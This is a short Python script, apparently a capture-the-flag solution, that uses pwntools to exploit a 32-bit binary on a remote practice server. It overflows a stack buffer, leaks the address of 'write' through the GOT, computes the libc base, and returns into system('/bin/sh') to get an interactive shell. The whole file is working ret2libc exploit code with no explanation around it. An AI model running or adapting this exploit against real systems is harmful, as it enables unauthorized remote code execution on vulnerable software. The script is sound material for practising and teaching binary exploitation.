from pwn import *
from LibcSearcher import *
context(os = 'linux',arch = 'i386',log_level = 'debug')


#sh=process("./timu")
sh=remote("node4.buuoj.cn",29662)
elf=ELF("./timu")
libc=ELF("./libc-2.27.so")

write_plt=p32(elf.plt["write"])
write_got=p32(elf.got["write"])
main_addr=p32(0x080484C6)

payload=0x8c*b'a'+write_plt+main_addr+p32(1)+write_got+p32(4)
sh.send(payload)
#write_addr=u32(sh.recvuntil(b"\x7f").ljust(4,b"\x00"))
write_addr=u32(sh.recv(4))
print("write_addr =",hex(write_addr))
#libc=LibcSearcher("write",write_addr)
#libc_base=write_addr-libc.dump("write")
#system_addr=libc_base+libc.dump("system")
#bin_sh=libc_base+libc.dump("str_bin_sh")

libc_base=write_addr-libc.sym["write"]
print("base =",libc_base)
system_addr=libc_base+libc.sym["system"]
bin_sh=libc_base+next(libc.search(b"/bin/sh"))

payload1=0x8c*b'a'+p32(system_addr)+b'aaaa'+p32(bin_sh)
sh.send(payload1)


sh.interactive()
